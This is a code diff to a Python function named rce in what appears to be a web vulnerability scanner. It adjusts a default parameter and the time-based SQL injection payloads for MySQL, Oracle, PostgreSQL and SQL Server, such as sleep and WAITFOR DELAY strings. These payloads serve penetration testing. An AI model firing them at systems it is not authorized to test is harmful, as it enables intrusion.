@@ -275,7 +275,7 @@ def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False):
   return (False,'')
 
 
-def rce(u,payload_index=0,save_to_file=None,injection={"code":"php"},start_line=None,replaceble_parameters={"phpvalue":(".","")},end_line=None,based_on="time",delay=10,logs=True,fill_empty=10,proxy=None,proxies=None,timeout=40,user_agent=None,cookie=None,debug=False):
+def rce(u,payload_index=0,save_to_file=None,injection={"code":"php"},start_line=" - ",replaceble_parameters={"phpvalue":(".","")},end_line=None,based_on="time",delay=10,logs=True,fill_empty=10,proxy=None,proxies=None,timeout=40,user_agent=None,cookie=None,debug=False):
   '''
    this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -346,22 +346,22 @@ def rce(u,payload_index=0,save_to_file=None,injection={"code":"php"},start_line=
                    "mysql":
                            {
                             "time":
-                                   [" - sleep({}) "]
+                                   [" sleep({}) "]
                            },
                    "oracle":
                             {
                              "time":
-                                    [" - dbms_lock.sleep({}) "]
+                                    [" dbms_lock.sleep({}) "]
                             },
                    "postgre":
                              {
                               "time":
-                                     [" - pg_sleep({}) "]
+                                     [" pg_sleep({}) "]
                              },
                    "sql_server":
                                 {
                                  "time":
-                                        [" - WAITFOR DELAY '00:00:{}' "]
+                                        [" WAITFOR DELAY '00:00:{}' "]
                                 }
                   }              
   }
